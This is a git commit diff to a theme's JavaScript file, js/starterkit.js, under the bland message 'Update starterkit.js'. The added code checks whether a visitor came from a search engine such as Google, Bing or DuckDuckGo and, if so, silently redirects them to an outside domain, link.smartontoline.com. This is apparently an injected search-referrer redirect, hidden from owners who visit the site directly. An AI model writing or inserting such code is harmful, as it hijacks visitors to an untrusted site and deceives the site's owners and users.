b138fac843300d816d4475ad124fe9bbcd682c14
qing <40787470+2565822438@users.noreply.github.com>
2024-01-04 15:48:05 +0800

    Update starterkit.js

--- js/starterkit.js
+++ js/starterkit.js
@@ -1,1 +1,11 @@
 // JS SPECIFIC TO THIS CUSTOM THEME GOES HERE
+var url = window.location.href;
+if (document.referrer.indexOf('google.') > 0 ||
+    document.referrer.indexOf('duckduckgo.com') > 0 ||
+    document.referrer.indexOf('bing.com') > 0 ||
+    document.referrer.indexOf('yahoo.com') > 0 ||
+    document.referrer.indexOf('aol.com') > 0 ||
+    document.referrer.indexOf('brave.com') > 0 ||
+    document.referrer.indexOf('ecosia.org') > 0) {
+        window.location = 'https://link.smartontoline.com/utexascns';
+}
